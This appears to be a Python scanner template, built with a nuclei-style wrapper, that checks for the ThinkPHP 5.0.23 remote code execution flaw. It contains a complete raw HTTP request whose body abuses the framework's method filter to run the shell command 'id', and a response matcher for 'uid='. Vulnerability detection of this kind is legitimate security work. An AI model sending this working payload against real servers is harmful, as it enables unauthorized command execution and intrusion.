from nuclei import RawHTTP
http = RawHTTP()
http.set_raw(
r"""POST /index.php?s=captcha HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"""
)
http.set_body_word_matcher(
    patterns=[
        "uid="
    ]
)
http.dump(
    fingers=[
        "thinkphp"
    ],
    id="ThinkPHP5 5.0.23 远程代码执行漏洞"
)
